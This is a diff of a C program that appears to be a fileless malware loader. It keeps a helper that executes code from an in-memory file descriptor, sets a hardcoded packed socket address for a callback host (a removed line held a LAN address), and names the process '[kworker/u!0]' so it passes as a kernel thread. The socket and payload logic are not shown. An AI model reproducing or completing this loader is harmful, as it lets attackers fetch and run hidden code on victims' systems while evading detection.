@@ -13,15 +13,6 @@
 #include <fcntl.h>
 
 
-// memfd_open Syscall not defined
-// Got index from http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/
-//#define __NR_memfd_create 319
-//#define MFD_CLOEXEC 1
-
-//static inline int memfd_create(const char *name, unsigned int flags) {
-//    return syscall(__NR_memfd_create, name, flags);
-//}
-
 extern char        **environ;
 int
 my_fexecve (int fd, char **arg, char **env)
@@ -31,12 +22,12 @@ my_fexecve (int fd, char **arg, char **env)
   execve (fname, arg, env);
   return 0;
 }
+
 int
 main (int argc, char **argv)
 {
   int                fd, s;
   unsigned long      addr = 0x0100007f11110002;
-  //unsigned long      addr = 0x6f0aa8C011110002;
   char               *args[2]= {"[kworker/u!0]", NULL};
   char               buf[1024];
 
